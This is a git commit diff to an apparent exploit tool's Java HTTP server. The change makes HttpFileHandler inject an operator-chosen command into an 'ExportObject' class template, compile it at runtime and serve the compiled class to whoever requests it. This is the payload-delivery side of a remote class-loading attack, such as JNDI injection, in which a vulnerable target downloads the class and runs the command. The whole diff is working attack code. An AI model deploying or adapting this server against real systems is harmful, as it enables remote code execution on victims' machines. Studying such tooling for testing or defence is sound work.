2c21076984422083e1994a77decc02dc03c6532c
sciccone <sciccone@gdssecurity.com>
2018-06-21 00:06:29 +0100

    removed temp files
    removed temp files

--- src/main/java/gds/els/HttpFileHandler.java
+++ src/main/java/gds/els/HttpFileHandler.java
@@ -3,7 +3,15 @@ package gds.els;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.IOException;
 import java.io.InputStream;
+import java.io.PrintWriter;
+import java.nio.charset.StandardCharsets;
+
+import javax.tools.JavaCompiler;
+import javax.tools.ToolProvider;
+
+import org.apache.commons.io.IOUtils;
 
 import com.sun.net.httpserver.HttpExchange;
 import com.sun.net.httpserver.HttpHandler;
@@ -12,29 +20,70 @@ import com.sun.net.httpserver.HttpHandler;
 public class HttpFileHandler implements HttpHandler {
 
 	private static final String TEMP_DIR = System.getProperty("java.io.tmpdir");
-	private static final File TEMP_FILE = new File(TEMP_DIR + File.separator + "ExportObject.class");
+	private String command;
 	
+	public HttpFileHandler(String command) {
+		this.command = command;
+	}
 
 	public void handle(HttpExchange httpExchange) {
 
 		System.out.println("[+] new http request from " + httpExchange.getRemoteAddress() + " " + httpExchange.getRequestURI());
 
-		try (InputStream inputStream = new FileInputStream(TEMP_FILE) ) {
-
-			System.out.println("[+] serving file: " + TEMP_FILE.getAbsolutePath());
-
-			ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-			while(inputStream.available()>0) {
-				byteArrayOutputStream.write(inputStream.read());
+		try (InputStream inputStream = MyHttpServer.class.getClassLoader().getResourceAsStream("ExportObject.template") )
+		{
+			if (null == inputStream || inputStream.available() < 0) {
+				System.out.println("[-] ExportObject.template not found");
+				System.out.println("[-] HTTP server not running");
+				System.exit(1);
 			}
 
-			byte[] bytes = byteArrayOutputStream.toByteArray();
-			httpExchange.sendResponseHeaders(200, bytes.length);
-			httpExchange.getResponseBody().write(bytes);
-			httpExchange.close();
+			// create ExportObject.java file
+			File temp = new File(TEMP_DIR + File.separator + "ExportObject.java");
+			try (PrintWriter out = new PrintWriter(temp) ) {
+				System.out.println("[+] creating file " + temp.getName() + " with embedded command: " + command);
+				String str = IOUtils.toString(inputStream, StandardCharsets.UTF_8);
+				String res = str.replace("<COMMAND>", command.replace("\"", "\\\""));
+				out.write(res);
+			}
 
-		} catch(Exception e) {
+			// compile at runtime
+	        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
+	        if (null == compiler) {
+				System.out.println("[-] JavaCompiler is null - use JDK instead of JRE");
+				System.exit(2);
+	        }
+	        if (0 != compiler.run(null, null, null, temp.getAbsolutePath())) {
+				System.out.println("[-] JavaCompiler failed");
+				System.exit(3);
+	        }
+	        File res = temp.toPath().getParent().resolve("ExportObject.class").toFile();
+			System.out.println("[+] compiling file " + res.getName());
+			
+			// return the compiled class
+			try (InputStream is = new FileInputStream(res) ) {
+
+				System.out.println("[+] serving file: " + res.getAbsolutePath());
+
+				ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+				while (is.available() > 0) {
+					byteArrayOutputStream.write(is.read());
+				}
+
+				byte[] bytes = byteArrayOutputStream.toByteArray();
+				httpExchange.sendResponseHeaders(200, bytes.length);
+				httpExchange.getResponseBody().write(bytes);
+				httpExchange.close();
+			}
+			
+			// remove temp files
+			temp.delete();
+			res.delete();
+	        
+		} catch (IOException e) {
+			System.out.println("[-] Exception: " + e.getMessage());
 			e.printStackTrace();
-		}
+			System.exit(4);
+		} 
 	}
 }
--- src/main/java/gds/els/MyHttpServer.java
+++ src/main/java/gds/els/MyHttpServer.java
@@ -21,46 +21,9 @@ public class MyHttpServer {
 			
 	public static void run(InetAddress host, int port, String command) {
 
-		try (InputStream inputStream = MyHttpServer.class.getClassLoader().getResourceAsStream("ExportObject.template") )
-		{
-			if (null == inputStream || inputStream.available() < 0) {
-				System.out.println("[-] ExportObject.template not found");
-				System.out.println("[-] HTTP server not running");
-				System.exit(1);
-			}
-
-			// create ExportObject.java file
-			File temp = new File(TEMP_DIR + File.separator + "ExportObject.java");
-			try (PrintWriter out = new PrintWriter(temp) ) {
-				System.out.println("[+] creating file " + temp.getName() + " with embedded command: " + command);
-				String str = IOUtils.toString(inputStream, StandardCharsets.UTF_8);
-				String res = str.replace("<COMMAND>", command.replace("\"", "\\\""));
-				out.write(res);
-			}
-
-			// compile at runtime
-	        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
-	        if (null == compiler) {
-				System.out.println("[-] JavaCompiler is null - use JDK instead of JRE");
-				System.exit(2);
-	        }
-	        if (0 != compiler.run(null, null, null, temp.getAbsolutePath())) {
-				System.out.println("[-] JavaCompiler failed");
-				System.exit(3);
-	        }
-	        File res = temp.toPath().getParent().resolve("ExportObject.class").toFile();
-			System.out.println("[+] compiled file " + res.getName());
-	        
-		} catch (IOException e) {
-			System.out.println("[-] Exception: " + e.getMessage());
-			e.printStackTrace();
-			System.exit(4);
-		} 
-		
-		// launch http server
 		try {
 			HttpServer httpServer = HttpServer.create(new InetSocketAddress(host, port), 0);
-			httpServer.createContext("/ExportObject.class", new HttpFileHandler());
+			httpServer.createContext("/ExportObject.class", new HttpFileHandler(command));
 			httpServer.setExecutor(null);
 			httpServer.start();
 			System.out.println("[+] HTTP server listening on " + host.getHostAddress() + ":" + port);
